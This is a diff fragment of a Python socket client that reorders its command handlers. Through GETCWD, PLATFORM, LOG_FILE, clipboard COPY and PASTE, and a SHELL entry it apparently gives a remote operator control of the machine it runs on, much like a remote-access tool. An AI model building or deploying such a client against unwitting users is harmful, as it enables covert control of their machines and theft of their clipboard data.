@@ -330,12 +330,20 @@ class Client(object):
             # data[2]: data2
             # ...
 
-            if data[0] == 'LOG_FILE':
-                self.send(LOG.encode())
+            if data[0] == 'GETCWD':
+                self.send(os.getcwdb())
                 continue
-
+            
+            if data[0] == 'LIST':
+                self.socket.send(b' ')
+                continue
+            
             if data[0] == 'PLATFORM':
                 self.send(platform.system().encode())
+                continue
+
+            if data[0] == 'LOG_FILE':
+                self.send(LOG.encode())
                 continue
 
             if data[0] == '_INFO':
@@ -388,10 +396,6 @@ class Client(object):
                 time.sleep(5)
                 break
 
-            if data[0] == 'LIST':
-                self.socket.send(b' ')
-                continue
-
             if data[0] == 'CLEAR':
                 if platform.system() == 'Windows':
                     os.system('cls')
@@ -421,14 +425,6 @@ class Client(object):
                     self.send(json_dumps([False, errors(e, line=False)]))
                     continue
                 self.send(json_dumps([True, None]))
-                continue
-
-            if data[0] == 'COPY':
-                try:
-                    pyperclip.copy(data[1])
-                    self.send(json_dumps([True, None]))
-                except Exception as e:
-                    self.send(json_dumps([False, errors(e)]))
                 continue
 
             if data[0] == 'INFO':
@@ -480,15 +476,19 @@ class Client(object):
                 self.send(json_dumps([True]))
                 continue
 
+            if data[0] == 'COPY':
+                try:
+                    pyperclip.copy(data[1])
+                    self.send(json_dumps([True, None]))
+                except Exception as e:
+                    self.send(json_dumps([False, errors(e)]))
+                continue
+
             if data[0] == 'PASTE':
                 try:
                     self.send(json_dumps([True, pyperclip.paste()]))
                 except Exception as e:
                     self.send(json_dumps([False, errors(e)]))
-                continue
-
-            if data[0] == 'GETCWD':
-                self.send(os.getcwdb())
                 continue
 
             if data[0] == 'SHELL':
